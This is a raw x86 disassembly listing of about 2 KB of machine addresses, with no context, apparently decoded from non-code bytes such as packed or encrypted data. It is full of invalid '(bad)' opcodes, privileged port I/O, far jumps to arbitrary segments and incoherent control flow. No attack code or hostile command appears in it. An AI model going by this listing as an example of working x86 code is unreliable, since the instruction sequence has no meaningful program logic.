  416612:	dec    eax
  416613:	xchg   esp,eax
  416614:	xchg   ebp,eax
  416615:	inc    eax
  416616:	sub    cl,ch
  416618:	adc    DWORD PTR [eax-0x33],eax
  41661b:	ds call 0xa9566675
  416621:	cmp    eax,0xfed9ca72
  416626:	lods   eax,DWORD PTR ds:[esi]
  416627:	scas   eax,DWORD PTR es:[edi]
  416628:	sub    esp,DWORD PTR [ebx+edx*2-0x54]
  41662c:	and    DWORD PTR ds:0xc476df0e,ecx
  416632:	stos   BYTE PTR es:[edi],al
  416633:	dec    esp
  416634:	adc    eax,0x4dab16e3
  416639:	repz sub eax,0x7c9bd8a9
  41663f:	int3   
  416640:	and    eax,0x141ff879
  416645:	mov    ebx,0xf50c120
  41664a:	sahf   
  41664b:	or     ebx,esp
  41664d:	dec    ebx
  41664e:	in     eax,0xfb
  416650:	mov    edx,DWORD PTR [ecx]
  416652:	adc    eax,0x919d9bb6
  416657:	jne    0x416653
  416659:	sub    edi,DWORD PTR [ebx-0x18]
  41665c:	pop    esi
  41665d:	pushf  
  41665e:	adc    ebx,DWORD PTR [ecx+0x31]
  416661:	xor    DWORD PTR [esi-0x31],ebp
  416664:	icebp  
  416665:	(bad)  
  416666:	rcl    dh,cl
  416668:	ret    0xedaf
  41666b:	ins    BYTE PTR es:[edi],dx
  41666c:	aaa    
  41666d:	sti    
  41666e:	lds    edx,FWORD PTR [edi-0x4e647ae6]
  416674:	jp     0x416609
  416676:	shl    DWORD PTR [eax+edx*2-0x10331f76],cl
  41667d:	or     eax,0x9fcb151
  416682:	scas   eax,DWORD PTR es:[edi]
  416683:	jecxz  0x41663e
  416685:	loopne 0x4166ac
  416687:	shr    BYTE PTR [ebp+0x129274d5],1
  41668d:	or     BYTE PTR [eax],ah
  41668f:	int3   
  416690:	mov    ebp,0x55d593ba
  416695:	repz in eax,0x17
  416698:	xlat   BYTE PTR ds:[ebx]
  416699:	xchg   edx,eax
  41669a:	mov    esi,0x2c28d5ca
  41669f:	imul   ecx,DWORD PTR [ecx-0x64],0xffffffcd
  4166a3:	push   0xffffffc1
  4166a5:	xchg   edx,eax
  4166a6:	(bad)  
  4166a8:	inc    ebp
  4166a9:	scas   al,BYTE PTR es:[edi]
  4166aa:	mov    ds:0xd4e0fdaf,al
  4166af:	cdq    
  4166b0:	push   es
  4166b1:	retf   0x310e
  4166b4:	xchg   ebx,eax
  4166b5:	clc    
  4166b6:	xor    dh,BYTE PTR [edx]
  4166b8:	rcr    BYTE PTR [eax],1
  4166ba:	sbb    al,BYTE PTR [eax-0xf8d23c5]
  4166c0:	out    0xdd,al
  4166c2:	shl    DWORD PTR ds:0x5a4fe34e,0xcf
  4166c9:	sbb    DWORD PTR [eax-0x1e],ebx
  4166cc:	in     eax,0xa2
  4166ce:	in     al,dx
  4166cf:	das    
  4166d0:	push   0x1e2c599b
  4166d5:	sbb    BYTE PTR [edx],ah
  4166d7:	pop    ebx
  4166d8:	adc    BYTE PTR ds:0xaaa315f9,dl
  4166de:	stc    
  4166df:	push   es
  4166e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166e1:	fisub  DWORD PTR [edx]
  4166e3:	data16 cs js 0x416706
  4166e7:	(bad)  
  4166e8:	leave  
  4166e9:	cmp    BYTE PTR [edi],cl
  4166eb:	call   0xef01ceae
  4166f0:	jmp    0x155a:0xf4b77814
  4166f7:	into   
  4166f8:	mov    bl,0x8
  4166fa:	push   ebp
  4166fb:	sar    BYTE PTR [edi+eax*1+0x564035b8],cl
  416702:	out    dx,al
  416703:	dec    ecx
  416704:	jbe    0x4166e8
  416706:	call   0x5c67:0x10c64ed
  41670d:	push   esp
  41670e:	call   0xc4d5:0x6f961bb4
  416715:	jg     0x416723
  416717:	dec    edx
  416718:	xchg   BYTE PTR [ebx-0x6f],bh
  41671b:	out    dx,al
  41671c:	pop    ebx
  41671d:	xor    ch,ah
  41671f:	adc    eax,0x69304876
  416724:	fisttp DWORD PTR [ebx]
  416726:	mov    bh,bh
  416728:	data16 (bad) 
  41672b:	fs retf 0x2d91
  41672f:	jcxz   0x416747
  416732:	nop
  416733:	repz jmp 0x82c4:0x7b120e9a
  41673b:	aaa    
  41673c:	retf   
  41673d:	mov    edx,0xb2ef3b12
  416742:	dec    ecx
  416743:	idiv   DWORD PTR ds:[ebx]
  416746:	xchg   esi,eax
  416747:	shl    BYTE PTR [edi],0xd9
  41674a:	(bad)  
  41674b:	les    ecx,FWORD PTR [ecx+0x7a]
  41674e:	or     ah,BYTE PTR [ebp+edi*2-0x1]
  416752:	inc    esi
  416753:	popa   
  416754:	inc    edi
  416755:	(bad)  
  416756:	dec    ebp
  416757:	dec    edi
  416758:	xchg   ebx,eax
  416759:	jle    0x416774
  41675b:	push   0x25a44f7a
  416760:	inc    edi
  416761:	mov    bh,0x59
  416763:	xor    bl,BYTE PTR [esi+0x21]
  416766:	into   
  416767:	xchg   BYTE PTR [esi],ch
  416769:	push   ecx
  41676a:	inc    edx
  41676b:	cmp    esp,DWORD PTR [edi-0xf59378d]
  416771:	loope  0x4167d9
  416773:	push   cs
  416774:	mov    ?,esi
  416776:	fcom   st(4)
  416778:	sti    
  416779:	sahf   
  41677a:	jnp    0x416769
  41677c:	std    
  41677d:	ins    BYTE PTR es:[edi],dx
  41677e:	cmp    al,0x5f
  416780:	popf   
  416781:	or     eax,DWORD PTR [edi+0x4195f3e6]
  416787:	ror    DWORD PTR [ecx+0x16],0xf0
  41678b:	ins    DWORD PTR es:[edi],dx
  41678c:	lds    edi,FWORD PTR [ecx]
  41678e:	and    BYTE PTR [ebx+0x4c],dl
  416791:	ret    
  416792:	adc    esp,0xffffff98
  416795:	mov    bl,0x48
  416797:	dec    ebx
  416798:	in     al,dx
  416799:	aas    
  41679a:	push   cs
  41679b:	lods   al,BYTE PTR ds:[esi]
  41679c:	lods   al,BYTE PTR ds:[esi]
  41679d:	or     eax,0x117f809d
  4167a2:	int    0x91
  4167a4:	mov    ecx,0xa5a13c0c
  4167a9:	cdq    
  4167aa:	mov    ebx,0x7aa9eb88
  4167af:	or     eax,0xccc75d6a
  4167b4:	mov    edx,0x9c132bd2
  4167b9:	or     BYTE PTR [ebp+0x61],cl
  4167bc:	mov    al,0x79
  4167be:	cs popf 
  4167c0:	jbe    0x416834
  4167c2:	stc    
  4167c3:	inc    edi
  4167c4:	rcr    DWORD PTR [ebx+0x55],0x59
  4167c8:	push   ebp
  4167c9:	cmc    
  4167ca:	push   ss
  4167cb:	pop    ss
  4167cc:	test   al,0x5e
  4167ce:	inc    ebx
  4167cf:	loope  0x41681a
  4167d1:	lahf   
  4167d2:	push   esp
  4167d3:	sbb    al,0x3b
  4167d5:	mov    ebx,DWORD PTR [edi+0x42578c6e]
  4167db:	adc    ch,dh
  4167dd:	rol    BYTE PTR [edi+0x4c0c969a],0x4f
  4167e4:	xchg   esi,eax
  4167e5:	rol    BYTE PTR [esi-0x76],cl
  4167e8:	push   ds
  4167e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167ea:	xor    eax,0x72d38e75
  4167ef:	loop   0x41677c
  4167f1:	in     eax,dx
  4167f2:	fs adc eax,0x2bcf3b73
  4167f8:	mov    ah,0x9
  4167fa:	mov    eax,0x7660c5f7
  4167ff:	inc    eax
  416800:	rol    DWORD PTR [ebx-0x5c],cl
  416803:	aam    0xc6
  416805:	lods   eax,DWORD PTR ds:[esi]
  416807:	loopne 0x4167b2
  416809:	pusha  
  41680a:	cdq    
  41680b:	jmp    0x41680a
  41680d:	push   eax
  41680e:	retf   0x4a33
  416811:	xor    bh,al
  416813:	mov    BYTE PTR [edi-0x34],ah
  416816:	jmp    0x416871
  416818:	mov    cl,0x2b
  41681a:	ret    
  41681b:	and    bl,dh
  41681d:	stos   DWORD PTR es:[edi],eax
  41681e:	iret   
  41681f:	and    bh,BYTE PTR [ecx-0x80]
  416822:	xchg   DWORD PTR [ecx-0x4188809c],ebx
  416828:	mov    WORD PTR [eax+ebx*1+0x43],?
  41682c:	jg     0x4167e5
  41682e:	sub    bh,BYTE PTR [eax+eax*2+0x5]
  416832:	sbb    edx,DWORD PTR [esi]
  416834:	lds    edx,FWORD PTR [eax+0x6d]
  416837:	or     ebp,DWORD PTR [ecx]
  416839:	les    ecx,FWORD PTR [esi]
  41683b:	sbb    bl,dh
  41683d:	mov    esp,0xbbbf0402
  416842:	hlt    
  416843:	nop
  416844:	adc    eax,0xa0ca20a8
  416849:	pop    ecx
  41684a:	or     eax,DWORD PTR [ecx]
  41684c:	ret    
  41684d:	pusha  
  41684e:	push   cs
  41684f:	scas   al,BYTE PTR es:[edi]
  416850:	inc    edx
  416851:	and    al,0x55
  416853:	out    0xb1,al
  416855:	or     al,BYTE PTR [eax+0x76]
  416858:	retf   
  416859:	dec    eax
  41685a:	adc    eax,0xdb2ddb69
  41685f:	jmp    0x1bf0:0xc47ed3ee
  416866:	add    DWORD PTR ds:0xed0f1fce,0xd40e00bd
  416870:	and    ebp,DWORD PTR [ebp+0x25b9904]
  416876:	out    dx,al
  416877:	push   eax
  416878:	dec    esi
  416879:	pop    es
  41687a:	fst    QWORD PTR [eax+0x77e2b01]
  416880:	jl     0x416889
  416882:	jecxz  0x4168e7
  416884:	test   cl,bl
  416886:	push   0xab1eb04d
  41688b:	mov    edx,0x992b6bb5
  416890:	(bad)  
  416892:	inc    edi
  416893:	int    0x33
  416895:	inc    ebp
  416896:	push   0xffffffdb
  416898:	xchg   ebx,eax
  416899:	cmp    eax,0x3e964775
  41689e:	jnp    0x416898
  4168a0:	std    
  4168a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168a2:	leave  
  4168a3:	pusha  
  4168a4:	leave  
  4168a5:	sbb    esp,DWORD PTR ds:0x5e1f1f9b
  4168ab:	(bad)  
  4168ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168ae:	loop   0x41683b
  4168b0:	fiadd  WORD PTR [ecx]
  4168b2:	push   ecx
  4168b3:	rol    BYTE PTR [esi],cl
  4168b5:	xlat   BYTE PTR ds:[ebx]
  4168b6:	call   0x465d518c
  4168bb:	add    esi,eax
  4168bd:	cmp    DWORD PTR [ebx],eax
  4168bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168c0:	fdiv   QWORD PTR [esi+0x1d627c9d]
  4168c6:	sbb    bl,BYTE PTR [ecx-0xde8b4e8]
  4168cc:	(bad)  
  4168cd:	adc    DWORD PTR [edi-0x20a22cbd],ebp
  4168d3:	rcl    ah,0x9d
  4168d6:	scas   al,BYTE PTR es:[edi]
  4168d7:	fild   QWORD PTR [eax]
  4168d9:	gs push ds
  4168db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168dc:	fnstsw WORD PTR [ebx]
  4168de:	int3   
  4168df:	cmp    eax,0x58331c69
  4168e4:	cmp    eax,0xcb77a92f
  4168e9:	je     0x4168d4
  4168eb:	das    
  4168ec:	scas   eax,DWORD PTR es:[edi]
  4168ed:	dec    ebp
  4168ee:	jno    0x41690f
  4168f0:	sar    DWORD PTR ds:0x5fa0cf38,cl
  4168f6:	push   edx
  4168f7:	aad    0xdc
  4168f9:	dec    ebp
  4168fa:	popa   
  4168fb:	xchg   ebp,eax
  4168fc:	mov    al,0x7c
  4168fe:	or     edi,DWORD PTR [ecx]
  416900:	jne    0x41694c
  416902:	cmp    DWORD PTR [esi-0x1a5ca51e],edx
  416908:	retf   
  416909:	mov    ebp,0x22b29ddd
  41690e:	outs   dx,DWORD PTR ds:[esi]
  41690f:	mov    cl,0x2b
  416911:	and    cl,ch
  416913:	sub    BYTE PTR [ebp+0x32],cl
  416916:	xor    al,0x4e
  416918:	or     DWORD PTR [ecx],edi
  41691a:	push   ebx
  41691b:	enter  0x3376,0xb1
  41691f:	leave  
  416920:	jb     0x416950
  416922:	stc    
  416923:	fiadd  WORD PTR [edi]
  416925:	rcr    BYTE PTR [esi],1
  416927:	inc    eax
  416928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416929:	mov    bl,0xa1
  41692b:	int    0xd1
  41692d:	cmp    dl,0xb
  416930:	shr    DWORD PTR gs:[edx-0x7ed9cd1d],1
  416937:	retf   
  416938:	dec    ebp
  416939:	repz or al,0x18
  41693c:	adc    esp,DWORD PTR [edi+0x1]
  41693f:	fcomp  QWORD PTR [ebp-0x627f8b6]
  416945:	xor    al,0x0
  416947:	jp     0x41695b
  416949:	cs shl ebx,0x9
  41694d:	jecxz  0x4169bc
  41694f:	or     eax,0xf3639265
  416954:	outs   dx,DWORD PTR ds:[esi]
  416955:	and    al,0x8d
  416957:	or     dl,ch
  416959:	stos   DWORD PTR es:[edi],eax
  41695a:	rol    BYTE PTR [ecx],0xb5
  41695d:	xor    ebp,DWORD PTR [ebx+0x43]
  416960:	aaa    
  416961:	les    edx,FWORD PTR [esi+0x4d37235d]
  416967:	mov    ds:0x100554af,al
  41696c:	out    dx,al
  41696d:	and    eax,0x866541fd
  416972:	dec    ecx
  416973:	test   al,0xb4
  416975:	call   0xf9d74155
  41697a:	cdq    
  41697b:	pop    es
  41697c:	popf   
  41697d:	test   DWORD PTR [edx-0x66],edi
  416980:	xchg   ebp,eax
  416981:	mov    al,ds:0x576b5784
  416986:	jl     0x416956
  416988:	bound  ebp,QWORD PTR [eax]
  41698a:	jmp    0x4169c9
  41698c:	cld    
  41698d:	mov    BYTE PTR [ebx+0x38],dh
  416990:	push   esi
  416991:	or     DWORD PTR [eax-0x56],eax
  416994:	fistp  WORD PTR [ecx-0x1739144e]
  41699a:	jmp    0xe715:0x57a31c26
  4169a1:	add    BYTE PTR [esi-0x74173243],bl
  4169a7:	mov    ds:0x798f024c,al
  4169ac:	js     0x416964
  4169ae:	mov    al,ds:0x50b957c8
  4169b3:	sub    al,BYTE PTR [eax]
  4169b5:	sub    esp,ebx
  4169b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169b8:	pop    es
  4169b9:	loop   0x416954
  4169bb:	stos   BYTE PTR es:[edi],al
  4169bc:	pop    ds
  4169bd:	lahf   
  4169be:	scas   eax,DWORD PTR es:[edi]
  4169bf:	mov    ds:0x947ec60e,eax
  4169c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169c5:	sbb    esp,DWORD PTR [edx]
  4169c7:	enter  0xc03d,0xe6
  4169cb:	cmp    eax,0x15f66490
  4169d0:	ss mov esp,0xfee8f9c1
  4169d6:	sti    
  4169d7:	aam    0x4f
  4169d9:	and    dl,BYTE PTR [edi]
  4169db:	xchg   esp,eax
  4169dc:	mov    cl,0x77
  4169de:	jecxz  0x416a03
  4169e0:	hlt    
  4169e1:	mov    DWORD PTR [ebx-0x4462c64f],esi
  4169e7:	or     esi,DWORD PTR ds:0x3dc610c7
  4169ed:	das    
  4169ee:	jmp    0x4169ed
  4169f0:	xor    cl,BYTE PTR [ecx]
  4169f2:	ds or  al,0xd3
  4169f5:	sbb    eax,0xfb179925
  4169fa:	sub    BYTE PTR [eax-0x38b43c3f],bh
  416a00:	mov    bl,0x55
  416a02:	mov    al,0x77
  416a04:	cmp    eax,0x5c61b4f9
  416a09:	retf   
  416a0a:	int3   
  416a0b:	scas   eax,DWORD PTR es:[edi]
  416a0c:	cmp    eax,0x452e0df6
  416a11:	cld    
  416a12:	test   cl,ch
  416a14:	rol    BYTE PTR [ebx],0x97
  416a17:	jae    0x4169c0
  416a19:	sbb    esp,eax
  416a1b:	pop    ebp
  416a1c:	add    esi,DWORD PTR [ebx]
  416a1e:	mov    BYTE PTR [edi],0xb2
  416a21:	push   ecx
  416a22:	mov    edx,0xc86b60b8
  416a27:	fldpi  
  416a29:	sub    DWORD PTR [ecx-0x61],ebx
  416a2c:	mov    ecx,0xf314beb8
  416a31:	mov    ebx,0x985cd78f
  416a36:	xchg   ebp,eax
  416a37:	add    eax,0x5f2a3861
  416a3c:	ret    
  416a3d:	dec    ebp
  416a3e:	leave  
  416a3f:	js     0x4169d0
  416a41:	aas    
  416a42:	fld    st(7)
  416a44:	repz dec ecx
  416a46:	cmp    eax,0xc3611fbf
  416a4b:	call   0x6ba5:0x3f8ad149
  416a52:	pop    edi
  416a53:	in     eax,dx
  416a54:	ret    
  416a55:	push   ss
  416a56:	cld    
  416a57:	out    dx,al
  416a58:	jle    0x416a95
  416a5a:	in     al,dx
  416a5b:	test   eax,0xdc1c27f6
  416a60:	mov    ecx,0x6297a0ca
  416a65:	dec    edi
  416a66:	sub    eax,0x83802781
  416a6b:	imul   ebx,ecx,0x6e
  416a6e:	push   edi
  416a6f:	leave  
  416a70:	xchg   esi,eax
  416a71:	gs pop ds
  416a73:	lahf   
  416a74:	lahf   
  416a75:	retf   0x2332
  416a78:	out    dx,al
  416a79:	dec    esi
  416a7a:	js     0x416a70
  416a7c:	sbb    ch,BYTE PTR [ecx-0x2e]
  416a7f:	inc    edx
  416a80:	cmp    DWORD PTR ss:[edi],edx
  416a83:	or     esi,DWORD PTR [ebx+ecx*2+0x5]
  416a87:	push   ebp
  416a88:	arpl   WORD PTR [ebx+0x70],sp
  416a8b:	int3   
  416a8c:	pop    ss
  416a8d:	jns    0x416ae3
  416a8f:	fcom   DWORD PTR [edx+ebx*2+0x66]
  416a93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a94:	push   esp
  416a95:	stos   BYTE PTR es:[edi],al
  416a96:	adc    bh,BYTE PTR [edi]
  416a98:	addr16 pop esp
  416a9a:	mov    ecx,0x74267f01
  416a9f:	add    BYTE PTR [eax-0x3c],dl
  416aa2:	rcr    bl,cl
  416aa4:	es cmc 
  416aa6:	arpl   WORD PTR [edx-0x52],dx
  416aa9:	repnz mov cl,ch
  416aac:	addr16 mov bh,0x18
  416aaf:	pushf  
  416ab0:	xchg   ebp,eax
  416ab1:	loope  0x416afc
  416ab3:	inc    ebx
  416ab4:	scas   eax,DWORD PTR es:[edi]
  416ab5:	sti    
  416ab6:	mov    esi,edi
  416ab8:	mov    cl,0x2c
  416aba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416abb:	xor    DWORD PTR [edi+0x10],ebx
  416abe:	inc    edx
  416abf:	mov    WORD PTR [edx+0x4f],?
  416ac2:	repz mov al,ds:0x4ff01474
  416ac8:	cmp    al,bl
  416aca:	jb     0x416b4a
  416acc:	enter  0x665a,0xb3
  416ad0:	test   BYTE PTR ds:0x7ba280d5,0x6
  416ad7:	jbe    0x416b2d
  416ad9:	mov    eax,ds:0xcb52b1f0
  416ade:	ds test eax,0x1c800751
  416ae4:	push   ecx
  416ae5:	cmp    al,0x3e
  416ae7:	retf   0x5bb1
  416aea:	push   0xca5524e8
  416aef:	fidiv  WORD PTR [eax+0x76a5c6f9]
  416af5:	lods   al,BYTE PTR ds:[esi]
  416af6:	mov    ds:0x8a76a5fd,al
  416afb:	jne    0x416adf
  416afd:	retf   
  416afe:	sbb    BYTE PTR [ebp+0x6148c217],dl
  416b04:	ins    BYTE PTR es:[edi],dx
  416b05:	xchg   DWORD PTR [edx+edx*1],ebp
  416b08:	mov    ebp,0xe093422
  416b0d:	pop    esp
  416b0e:	jmp    0xa3efbaf4
  416b13:	lds    ebx,FWORD PTR [eax]
  416b15:	or     al,bh
  416b17:	jns    0x416b2e
  416b19:	bound  esi,QWORD PTR [eax]
  416b1b:	repz inc edx
  416b1d:	sbb    eax,0x32ba7c84
  416b22:	xchg   esp,eax
  416b23:	add    eax,0x4aa77ff6
  416b28:	dec    edx
  416b29:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  416b2b:	stc    
  416b2c:	fnstsw WORD PTR [ebx+eiz*2-0x6a]
  416b30:	mov    eax,0x6e6f93d7
  416b35:	in     eax,0x77
  416b37:	not    BYTE PTR ds:0x2a66e2d3
  416b3d:	sbb    cl,BYTE PTR [edi+0x440e5998]
  416b43:	xchg   BYTE PTR [edx],ah
  416b45:	and    ebx,DWORD PTR ds:0xb7d1138d
  416b4b:	fst    DWORD PTR [ebp-0x64f3f051]
  416b51:	outs   dx,BYTE PTR ds:[esi]
  416b52:	(bad)  
  416b53:	lock sahf 
  416b55:	xchg   ebp,eax
  416b56:	xchg   edi,eax
  416b57:	mov    dh,0x16
  416b59:	dec    ebp
  416b5a:	mov    eax,0xf80539a2
  416b5f:	icebp  
  416b60:	mov    bh,0x5c
  416b62:	fld    TBYTE PTR [edx+0x57]
  416b65:	out    0x87,eax
  416b67:	push   0x82830605
  416b6c:	xchg   ebx,eax
  416b6d:	mov    cl,0x4e
  416b6f:	jns    0x416ba3
  416b71:	int3   
  416b72:	inc    edx
  416b73:	push   cs
  416b74:	mov    bh,BYTE PTR [ebx+0x66]
  416b77:	call   0xc1c437aa
  416b7c:	(bad)  
  416b7d:	mov    bh,BYTE PTR [edi-0x485df17]
  416b83:	mov    WORD PTR [edx],cs
  416b85:	add    eax,0xfa9954dd
  416b8a:	add    eax,0xb6962002
  416b8f:	retf   
  416b90:	adc    bh,ah
  416b92:	pusha  
  416b93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b94:	rcl    DWORD PTR [edx-0x44d7a826],cl
  416b9a:	adc    DWORD PTR [ecx+0x67],eax
  416b9d:	jmp    0x416bbf
  416b9f:	fcomp  st(4)
  416ba1:	stc    
  416ba2:	in     al,0x48
  416ba4:	icebp  
  416ba5:	aad    0xf4
  416ba7:	push   edx
  416ba8:	and    dl,BYTE PTR [ecx+0x2d]
  416bab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bac:	adc    al,0x25
  416bae:	jb     0x416b7f
  416bb0:	dec    ebx
  416bb1:	dec    eax
  416bb2:	mov    ds:0x63c84de7,eax
  416bb7:	mov    eax,ds:0xab6ce2ee
  416bbc:	sub    ebp,ebp
  416bbe:	fldcw  WORD PTR [edx-0x532f4a7c]
  416bc4:	addr16 xchg ah,ah
  416bc7:	lods   eax,DWORD PTR ds:[esi]
  416bc8:	(bad)  
  416bc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bca:	or     BYTE PTR [esp+ebp*2+0x2a],al
  416bce:	add    BYTE PTR [ebp+0xc],dl
  416bd1:	loopne 0x416b8c
  416bd3:	mov    eax,0x3296d1c1
  416bd8:	jmp    0x4a5f907d
  416bdd:	add    eax,0xd12afbf5
  416be2:	je     0x416bda
  416be4:	adc    edx,DWORD PTR [esp+edi*2]
  416be7:	push   ebp
  416be8:	test   DWORD PTR [edi+0x747d126f],esp
  416bee:	rcl    BYTE PTR [esi+0x1e64f5fa],1
  416bf4:	xor    DWORD PTR [edx*8+0x566e1c09],edx
  416bfb:	cmp    al,0xc9
  416bfd:	or     DWORD PTR [ebp+ebx*8+0x7c2e4a33],ebx
  416c04:	aaa    
  416c05:	and    DWORD PTR ds:0xcfec5bf2,esi
  416c0b:	das    
  416c0c:	fs paddusw mm0,mm3
  416c10:	xchg   DWORD PTR ds:0x39e56215,ebx
  416c16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c17:	(bad)  [esi]
  416c19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c1a:	mov    al,ds:0xb49d2d40
  416c1f:	clc    
  416c20:	fdivr  QWORD PTR [edi-0x3ac8437a]
  416c26:	dec    ebx
  416c27:	mov    WORD PTR [ebp-0x5e],ds
  416c2a:	je     0x416caa
  416c2c:	pop    esi
  416c2d:	cmp    dl,al
  416c2f:	stos   DWORD PTR es:[edi],eax
  416c30:	pop    edx
  416c31:	pop    esi
  416c32:	or     eax,0xf2fb98d9
  416c37:	cmp    al,0x8f
  416c39:	test   BYTE PTR es:0x4e5c46b,ah
  416c40:	jmp    0xb1b5:0x6bf6d7ba
  416c47:	inc    eax
  416c48:	leave  
  416c49:	push   ecx
  416c4a:	jle    0x416c78
  416c4c:	and    ch,cl
  416c4e:	cmp    al,ah
  416c50:	outs   dx,DWORD PTR gs:[esi]
  416c52:	lock jbe 0x6469
  416c58:	test   al,0x1e
  416c5a:	adc    ecx,DWORD PTR [ebp-0x4f]
  416c5d:	out    0x33,eax
  416c5f:	loop   0x416c66
  416c61:	xchg   ecx,eax
  416c62:	jno    0x416be6
  416c64:	pusha  
  416c65:	pop    edx
  416c66:	out    0xd1,eax
  416c68:	fist   WORD PTR [ebx-0x38a8f924]
  416c6e:	jns    0x6a0667cf
  416c74:	iret   
  416c75:	fwait
  416c76:	cmp    cl,BYTE PTR [edi]
  416c78:	cli    
  416c79:	xchg   edi,eax
  416c7a:	push   ebp
  416c7b:	jcxz   0x416c28
  416c7e:	scas   eax,DWORD PTR es:[edi]
  416c7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c80:	xchg   BYTE PTR ss:[esi-0x5e],ah
  416c84:	fimul  WORD PTR [edx]
  416c86:	mov    bl,BYTE PTR [esi]
  416c88:	xor    BYTE PTR [esi+0x2f],0x94
  416c8c:	test   BYTE PTR ds:0xe845f80f,cl
  416c92:	cdq    
  416c93:	xor    DWORD PTR [edx+0x3e],esp
  416c96:	mov    dh,0x3e
  416c98:	and    ah,dl
  416c9a:	inc    ebx
  416c9b:	aaa    
  416c9c:	ins    BYTE PTR es:[edi],dx
  416c9d:	leave  
  416c9e:	ret    
  416c9f:	cli    
  416ca0:	xchg   ecx,eax
  416ca1:	push   ebx
  416ca2:	outs   dx,BYTE PTR ds:[esi]
  416ca3:	fisub  WORD PTR [edi]
  416ca5:	out    0xb9,al
  416ca7:	test   eax,0x3e1c5133
  416cac:	mov    ds:0xee1e0db5,al
  416cb1:	cld    
  416cb2:	(bad)  
  416cb3:	mov    ah,0xd
  416cb5:	mov    WORD PTR [ecx-0x1a],cs
  416cb8:	push   cs
  416cb9:	fs syscall 
  416cbc:	jecxz  0x416c41
  416cbe:	lods   eax,DWORD PTR ds:[esi]
  416cbf:	push   cs
  416cc0:	mov    esp,0x2081b84f
  416cc5:	mov    ebx,0x970e4ac4
  416cca:	cmc    
  416ccb:	sbb    DWORD PTR [eax],eax
  416ccd:	push   edi
  416cce:	pop    ecx
  416ccf:	adc    eax,0x67539640
  416cd4:	popa   
  416cd5:	add    BYTE PTR [ebp-0x12dc9893],bl
  416cdb:	lahf   
  416cdc:	inc    edi
  416cdd:	ficom  DWORD PTR [ecx-0x7c7336be]
  416ce3:	outs   dx,DWORD PTR cs:[esi]
  416ce5:	cwde   
  416ce6:	xchg   ebp,eax
  416ce7:	and    edi,eax
  416ce9:	daa    
  416cea:	mov    ah,0xfd
  416cec:	addr16 inc ecx
  416cee:	push   ds
  416cef:	mov    dl,0x65
  416cf1:	ss or  eax,0x393ffb9c
  416cf7:	arpl   WORD PTR [ecx-0x13],si
  416cfa:	mov    ds:0x86a45ae0,al
  416cff:	push   ds
  416d00:	mov    ebx,0x97655bf2
  416d05:	rcr    BYTE PTR [ebp-0xb5408ed],0x47
  416d0c:	dec    esi
  416d0d:	inc    eax
  416d0e:	call   0x50d318d4
  416d13:	sub    eax,0xbb152261
  416d18:	or     eax,0x9214924e
  416d1d:	jl     0x416d64
  416d1f:	xchg   edx,eax
  416d20:	jl     0x416d95
  416d22:	div    al
  416d24:	sti    
  416d25:	and    bl,BYTE PTR [ebx-0x4feeac1c]
  416d2b:	aad    0xd
  416d2d:	push   ebp
  416d2e:	inc    ebx
  416d2f:	daa    
  416d30:	je     0x416da5
  416d32:	pop    ecx
  416d33:	xchg   esp,eax
  416d34:	push   ebx
  416d35:	ins    DWORD PTR es:[edi],dx
  416d36:	or     eax,0x7c3bf481
  416d3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d3c:	shr    BYTE PTR [edi],0xea
  416d3f:	push   es
  416d40:	leave  
  416d41:	data16 das 
  416d43:	sub    BYTE PTR [eax-0x6c08938c],ah
  416d49:	mov    BYTE PTR [edi+0x24fa46fe],bh
  416d4f:	lock int 0x25
  416d52:	rcl    BYTE PTR [ebx],1
  416d54:	dec    esi
  416d55:	push   es
  416d56:	cwde   
  416d57:	mov    edi,0x7645b8f3
  416d5c:	rol    BYTE PTR [edi-0xefb6f7f],0xf8
  416d63:	sub    ebp,ecx
  416d65:	push   ecx
  416d66:	outs   dx,DWORD PTR ds:[esi]
  416d67:	repnz inc edi
  416d69:	rol    BYTE PTR [esi],1
  416d6b:	adc    ch,BYTE PTR [edx+edi*8]
  416d6e:	dec    eax
  416d6f:	lods   eax,DWORD PTR ds:[esi]
  416d70:	xchg   DWORD PTR [ecx-0xb],ebx
  416d73:	jp     0x416d5d
  416d75:	repnz xchg ebx,eax
  416d77:	and    bl,bl
  416d79:	jle    0x416dcf
  416d7b:	inc    eax
  416d7c:	adc    eax,0x4e1dfdb0
  416d81:	daa    
  416d82:	retf   
  416d83:	mov    bl,0xb2
  416d85:	push   esp
  416d86:	int    0x70
  416d88:	loop   0x416d8a
  416d8a:	pusha  
  416d8b:	sbb    al,0xd2
  416d8d:	leave  
  416d8e:	test   BYTE PTR [ebp+0x27944dd8],dh
  416d94:	mov    al,0xb7
  416d96:	je     0x416db1
  416d98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d99:	popf   
  416d9a:	enter  0x98ea,0x95
  416d9e:	xor    BYTE PTR [ebx+edx*4],0xdb
  416da2:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416da4:	pop    edx
  416da5:	pop    ebp
  416da6:	xor    BYTE PTR [ebx],al
  416da8:	jo     0x416d51
  416daa:	in     al,dx
  416dab:	loop   0x416dde
  416dad:	adc    DWORD PTR [esi-0x66],esp
  416db0:	shl    DWORD PTR [ebp+0x21d025ca],1
  416db6:	scas   eax,DWORD PTR es:[edi]
  416db7:	ficomp WORD PTR [eax-0x2b3e1654]
  416dbd:	leave  
